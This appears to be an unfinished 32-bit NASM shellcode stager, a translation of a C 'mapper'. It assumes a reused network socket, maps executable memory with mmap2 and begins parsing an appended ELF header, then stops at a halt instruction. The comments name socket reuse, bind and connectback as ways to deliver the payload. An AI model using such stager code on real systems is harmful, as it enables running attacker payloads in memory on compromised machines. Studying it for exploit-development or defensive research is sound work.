	;; Evan Jensen
	;; Translation of mapper.c by kiwiz

;;;  %eax = syscall number
;;;  args = %ebx, %ecx, %edx, %esi, %edi, %ebp (last can be ptr to > 6)
	
BITS 32
	global main


	%include "../include/short32.s"
	%include "../include/elf.s"
	%define PROT_READ      	4	
	%define PROT_WRITE     	2
	%define PROT_EXEC      	1
	%define MAP_PRIVATE	0x2  ; Changes are private.
	%define MAP_ANONYMOUS 	0x20 ; no file backing
	%define MAP_FIXED      	0x10 ; use exact address
main:
	;; possible techniques for identifying where data is coming from
	;; socket reuse, bind, connectback, attached at the end of our code
	;; assume socket reuse with socket in EBX
	push ebx
		
	;; get some memory to work with
	xor eax,eax
	mov al,mmap2
	xor ebx,ebx 		;addr, don't care
	xor ecx,ecx
	inc ecx
	shl ecx,15		;0x8000
	xor edx,edx
	mov dl, PROT_READ|PROT_WRITE|PROT_EXEC
	xor esi,esi
	or esi, byte MAP_PRIVATE | MAP_ANONYMOUS
	xor edi, edi
	dec edi			;-1
	xor ebp,ebp
	
	;;   mmap(0, 0x8000, 0x7, MAP_PRIVATE | MAP_ANONYMOUS ,-1,0)
	call [gs:0x10]		;__kernel_vsyscall
	;; int 0x80
	jmp ENDOFCODE
	have_elf:
	pop ebp			;pointer to elf header
	xchg edi,eax		; edi is pointer to the mapped memory	
;;;Elf32_Shdr* strtab = mem + ehdr->e_shoff + ehdr->e_shstrndx * ehdr->e_shentsize;
	mov eax, [ebp+e_shoff]
	mov ebx, [ebp+e_shstrndx]
	mov ecx, [ebp+e_shentsize]
	imul ebx,ecx
	add eax,ebp
	add eax,ebx
	;; eax=strtab
	
	hlt
	





	


ENDOFCODE:
	call have_elf
	